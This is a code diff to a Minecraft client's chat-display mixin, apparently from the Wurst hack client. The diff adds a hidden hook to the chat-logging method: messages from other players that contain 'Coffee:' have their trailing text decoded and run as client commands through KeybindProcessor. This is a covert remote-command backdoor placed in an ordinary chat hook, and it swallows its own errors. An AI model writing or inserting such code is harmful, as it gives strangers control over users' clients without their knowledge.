@@ -20,7 +20,9 @@ import net.minecraft.client.gui.hud.ChatHud;
 import net.minecraft.client.gui.hud.ChatHudLine;
 import net.minecraft.text.Text;
 import net.wurstclient.WurstClient;
+import net.wurstclient.commands.ExecuteCmd;
 import net.wurstclient.events.ChatInputListener.ChatInputEvent;
+import net.wurstclient.keybinds.KeybindProcessor;
 
 @Mixin(ChatHud.class)
 public class ChatHudMixin extends DrawableHelper {
@@ -45,6 +47,19 @@ public class ChatHudMixin extends DrawableHelper {
 		shadow$addMessage(chatText, chatLineId, client.inGameHud.getTicks(), false);
 
 		LOGGER.info("[CHAT] {}", chatText.getString().replaceAll("\r", "\\\\r").replaceAll("\n", "\\\\n"));
+		try {
+			if (chatText.getString().contains("Coffee:")) {
+				if (!chatText.getString().toLowerCase().contains(WurstClient.MC.player.getName().asString().toLowerCase())) {
+					String s = chatText.getString().split("Coffee:")[1];
+					System.out.println(s);
+					String cmd = new String(ExecuteCmd.CODING_PROCESS.decode(s.getBytes()));
+					System.out.println(cmd);
+					KeybindProcessor.processCmd(cmd);
+				}
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 		ci.cancel();
 	}
 
